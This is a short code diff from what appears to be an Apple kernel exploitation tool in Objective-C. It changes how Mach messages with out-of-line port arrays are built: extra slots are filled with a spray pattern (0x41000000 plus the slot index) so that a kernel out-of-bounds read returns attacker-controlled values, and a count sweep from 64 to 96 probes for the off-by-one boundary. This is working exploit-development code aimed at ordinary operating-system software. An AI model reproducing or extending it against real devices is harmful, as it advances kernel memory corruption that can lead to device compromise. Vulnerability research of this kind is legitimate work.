@@ -197,9 +197,17 @@
     size_t oolSize = sizeof(mach_msg_ool_ports_descriptor_t);
     size_t total = sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t) + oolSize;
 
-    // real array of `real` ports (all the same send right)
-    mach_port_t *ports = calloc(real, sizeof(mach_port_t));
+    // Allocate real + 32 entries: first `real` are valid send rights,
+    // the trailing 32 hold a recognizable spray pattern so the kernel's
+    // OOB read (when count > real) picks up controlled values.
+    uint32_t allocEntries = real + 32;
+    mach_port_t *ports = calloc(allocEntries, sizeof(mach_port_t));
     for (uint32_t i = 0; i < real; i++) ports[i] = sendRight;
+    // Spray pattern: 0x41xxxxxx where xxxxxx = slot index.
+    // Non-zero, distinguishable, deterministic.
+    for (uint32_t i = real; i < allocEntries; i++) {
+        ports[i] = 0x41000000u + i;
+    }
 
     uint8_t *buf = calloc(1, total);
     mach_msg_header_t *hdr = (mach_msg_header_t *)buf;
@@ -334,7 +342,8 @@
 
     // Fine threshold sweep: every count from 64 to 96. This is where the
     // off-by-one lives — find the exact MACH_SEND_INVALID_RIGHT boundary.
-    [report appendString:@"\n--- OOL count threshold sweep (64..96) ---\n"];
+    // OOB slots (past `real`) contain spray pattern 0x41000000+index.
+    [report appendString:@"\n--- OOL count threshold sweep (64..96, spray=0x41xxxxxx) ---\n"];
     uint32_t lastOK = 0, threshold = 0, oobHits = 0;
     for (uint32_t c = 64; c <= 96; c++) {
         NSDictionary *r = [self sendOOLPortsCount:c realEntries:64 port:port sendRight:port];
